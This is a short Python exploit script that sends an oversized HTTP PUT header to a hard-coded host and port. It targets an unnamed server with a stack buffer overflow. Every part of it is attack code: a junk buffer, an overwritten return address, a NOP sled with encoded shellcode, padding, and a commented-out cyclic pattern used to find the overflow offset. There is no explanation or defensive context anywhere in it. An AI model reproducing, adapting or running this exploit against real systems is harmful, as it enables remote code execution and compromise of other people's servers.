import socket

junk = "AAAAAAAAAAAAAAAAAAAAAAA"
ret = "\x20\x70\xd6\xf7"
buf =  "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
buf += "\xbf\x2f\x86\xa9\x81\xd9\xeb\xd9\x74\x24\xf4\x58\x2b"
buf += "\xc9\xb1\x12\x31\x78\x12\x83\xc0\x04\x03\x57\x88\x4b"
buf += "\x74\x96\x4f\x7c\x94\x8b\x2c\xd0\x31\x29\x3a\x37\x75"
buf += "\x4b\xf1\x38\xe5\xca\xb9\x06\xc7\x6c\xf0\x01\x2e\x04"
buf += "\xc4\x05\xd7\xab\xa2\xeb\xd8\x42\x6f\x65\x39\xd4\xe9"
buf += "\x25\xeb\x47\x45\xc6\x82\x86\x64\x49\xc6\x20\x19\x65"
buf += "\x94\xd8\x8d\x56\x75\x7a\x27\x20\x6a\x28\xe4\xbb\x8c"
buf += "\x7c\x01\x71\xce"

padding = "C"*(1024-len(junk)-len(buf)-len(ret))

ip = '6.6.7.2'
port = 1234

payload = "text/html"+junk+ret+buf+padding
#payload = "text/textAa0Aa1Aa2Aa3Aa4Aa5Aa6AaDDDDAa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0B"
overall = "PUT /asd HTTP/1.0\r\nType: "+payload+"\r\n\r\nDATA"

s = socket.socket()
s.connect((ip, port))
s.send(overall)
s.close()